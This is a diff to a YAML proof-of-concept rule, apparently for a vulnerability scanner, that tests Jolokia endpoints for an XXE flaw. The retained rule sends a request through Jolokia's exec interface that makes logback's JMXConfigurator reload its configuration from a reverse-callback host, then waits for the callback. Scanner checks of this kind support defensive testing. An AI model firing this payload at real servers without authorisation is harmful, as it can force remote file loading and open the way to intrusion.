@@ -1,19 +1,11 @@
-name: poc-yaml-jokolia-xxe
+name: poc-yaml-jolokia-xxe
 rules:
-  - method: GET
-    path: >-
-      /jolokia/
-    follow_redirects: false
-    expression: |
-      status == 200 && r'jolokia-access.xml'.bmatches(body)
   - method: GET
     path: >-
       /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/{{reverse_domain}}!/logback.xml
     follow_redirects: false
     expression: |
-      status == 200 && waitReverse(8)
-
-
+      status==200 && waitReverse(8)
 detail:
   author: loneyer
   links:
